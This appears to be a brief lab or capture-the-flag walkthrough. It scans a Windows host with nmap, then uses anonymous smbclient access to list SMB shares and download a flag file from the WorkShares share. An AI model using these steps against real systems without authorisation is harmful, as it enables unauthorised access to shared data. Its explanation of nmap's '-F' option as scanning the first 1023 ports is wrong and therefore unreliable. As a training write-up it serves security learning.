## scan

```bash
nmap -sS -A -F <targetIP>
```

* `-F` - only scan first 1023 ports

```
PORT    STATE SERVICE       VERSION  
135/tcp open  msrpc         Microsoft Windows RPC  
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp open  microsoft-ds?
```

* ports 139 and 445 are listening SMB ports. 139 is SMB over netBIOS, 445 is direct SMB. We can try anonymous login to SMB like we did with FTP.

<br>

## access using SMB

```bash
$ smbclient -L <targetIP>
```

hit Enter to pass empty password

```
Password for [WORKGROUP\artyom]:  
  
       Sharename       Type      Comment  
       ---------       ----      -------  
       ADMIN$          Disk      Remote Admin  
       C$              Disk      Default share  
       IPC$            IPC       Remote IPC  
       WorkShares      Disk         
SMB1 disabled -- no workgroup available
```

```bash
$ smbclient \\\\10.129.29.29\\WorkShares
smb> ls
smb> cd James.P
smb> get flag.txt
```

* note, we just tried all directories one at a time untill got access to WorkShares. 
